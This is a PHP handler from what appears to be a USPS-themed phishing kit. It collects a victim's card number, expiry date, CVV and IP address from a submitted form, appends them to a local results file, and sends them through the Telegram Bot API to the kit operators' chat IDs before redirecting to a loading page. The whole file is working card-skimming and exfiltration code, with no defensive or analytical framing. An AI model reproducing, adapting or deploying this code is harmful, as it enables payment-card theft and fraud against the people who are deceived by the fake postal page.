<?php 
extract($_REQUEST);
include "../id.php";

$CC=$_POST['card_num'];
$M=$_POST["date"];
$Y=$_POST["jeany"];
$CV=$_POST['code'];
$ipp=$_SERVER['REMOTE_ADDR'];
$message=">>>>>>>>>>>>>|🇺🇸| USPS Post |🇺🇸|<<<<<<<<<<<<"."\n"."CC Number :   ".$CC."\n"."Expire Date :   ".$M."\n"."CVV :   ".$CV."\n"."Ip :  ".$ipp."\n".">>>>>>>>>>>>>|💰| USPS Post |💰|<<<<<<<<<<<<";
$user_ids=$id;
$filee=fopen("../result.txt",'a');
fwrite($filee,$message."\n");
fclose($filee);
header("location: loading.php");
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot'.$token.'/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
include "../anti/antiproxy1.php";
}
?>